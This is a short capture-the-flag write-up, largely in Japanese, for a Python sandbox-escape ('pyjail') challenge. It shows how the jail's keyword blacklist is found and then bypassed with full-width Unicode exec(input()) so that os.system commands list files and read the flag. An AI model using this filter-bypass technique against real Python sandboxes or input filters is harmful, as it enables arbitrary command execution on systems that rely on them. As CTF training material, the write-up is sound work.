# Baby's First Pyjail:Jail:100pts
@windex told me that jails should be sourceless. So no source for you.  

`nc 35.226.249.45 5000`  

# Solution
ソースレスなpyjailらしい。  
```bash
$ nc 35.226.249.45 5000
>>> print(1)
1
>>> import os
try harder
>>> __import__('os')
try harder
>>> print(vars())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1ab717fc10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctfuser/app/chal.py', '__cached__': None, 'blacklist': ['import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'], 'cmd': 'print(vars())', 'i': '.'}
```
ブラックリストが含まれているようだ。  
これらをバイパスしてもよいが、せっかくなので全角文字テクニックを使う。  
```bash
$ nc 35.226.249.45 5000
>>> ｅｘｅｃ(ｉｎｐｕｔ())
__import__("os").system("ls")
chal.py
flag
>>> ｅｘｅｃ(ｉｎｐｕｔ())
__import__("os").system("cat flag")
uoftctf{you_got_out_of_jail_free}
```
flagが読み取れた。  

## uoftctf{you_got_out_of_jail_free}